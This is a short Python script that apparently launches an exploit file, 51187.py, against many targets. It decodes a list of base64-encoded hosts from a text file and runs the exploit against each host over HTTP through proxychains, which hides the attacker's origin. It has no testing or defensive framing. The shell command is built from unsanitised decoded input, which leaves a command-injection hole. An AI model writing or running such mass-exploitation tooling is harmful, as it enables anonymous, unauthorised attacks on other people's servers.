import os
import base64
counter=0
with open('outfile64.txt') as f:
    for line in f:
        base64_string =line.strip('\n')
        base64_bytes = base64_string.encode("ascii")
        sample_string_bytes = base64.b64decode(base64_bytes)
        sample_string = sample_string_bytes.decode("ascii")
        os.system('proxychains python 51187.py http://'+sample_string+'/')
        counter +=1


print("fin")
